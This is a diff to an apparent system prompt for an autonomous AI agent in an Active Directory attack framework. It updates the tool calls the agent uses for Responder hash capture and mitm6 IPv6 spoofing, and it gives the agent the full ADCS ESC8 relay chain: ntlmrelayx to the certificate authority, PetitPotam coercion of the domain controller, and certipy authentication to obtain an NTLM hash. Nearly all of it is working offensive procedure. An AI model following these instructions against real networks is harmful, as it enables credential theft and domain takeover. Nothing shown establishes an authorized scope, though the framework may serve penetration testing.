@@ -43,10 +43,11 @@ Your role is to capture authentication traffic and coerce systems to authenticat
 Primary tool for capturing hashes:
 ```
 start_responder(
-    interface=""  # Auto-detected (e.g., ens5 on AWS),
+    interface="<from task prompt>"  # Use the EXACT interface from your task (NOT eth0!)
     analyze_mode=False  # Set True for passive mode
 )
 ```
+**IMPORTANT: Always use the interface value provided in your task prompt. Do NOT guess interface names.**
 
 Captures:
 - NetNTLMv2 hashes from LLMNR queries
@@ -57,8 +58,8 @@ Captures:
 IPv6-based attacks:
 ```
 start_mitm6(
-    domain="corp.local",
-    interface=""  # Auto-detected (e.g., ens5 on AWS)
+    domain="contoso.local",
+    interface="<from task prompt>"  # Use the EXACT interface from your task (NOT eth0!)
 )
 ```
 
@@ -111,11 +112,11 @@ printerbug(
 ## Relay Attack Coordination
 
 ### For ADCS ESC8
-Coordinate with PrivEsc agent:
-1. PrivEsc starts certipy_relay_esc8
-2. You run petitpotam to coerce DC
-3. DC authenticates to relay
-4. Relay captures certificate
+You handle the full ESC8 attack chain:
+1. Start `ntlmrelayx_to_adcs(ca_host="ca.domain.local", attacker_ip="YOUR_IP")`
+2. Run `petitpotam(target="dc.domain.local", listener="YOUR_IP")` to coerce DC
+3. DC authenticates to relay, relay requests certificate from CA
+4. Certificate is saved, use `certipy_auth` (on privesc) to get NTLM hash
 
 ### For LDAP Relay
 ```
@@ -275,5 +276,5 @@ Call the `request_assistance` tool with:
 
 3. **Coordination**
    - Inform orchestrator before starting
-   - Coordinate relay with PrivEsc
+   - You own the full relay chain (ntlmrelayx + coercion)
    - Stop when objective achieved
